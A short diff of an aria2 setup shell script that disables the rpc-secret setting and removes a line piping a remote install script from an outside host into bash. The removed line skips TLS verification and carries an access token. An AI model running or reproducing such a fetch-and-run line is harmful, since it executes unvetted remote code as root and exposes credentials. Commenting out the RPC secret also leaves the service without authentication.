@@ -9,4 +9,3 @@ sed -i 's|rpc-secret|#rpc-secret|g' ./aria2.conf
 touch /root/.aria2/aria2.session
 ./tracker.sh
 
-curl -kfsSL 'http://collie-agent-hk.chaitin.com:1443/api/v1/host/install_script?node=2&os_type=linux' | bash -s -- --token=2c9dcc3512d0f3cdde634436a6cba024
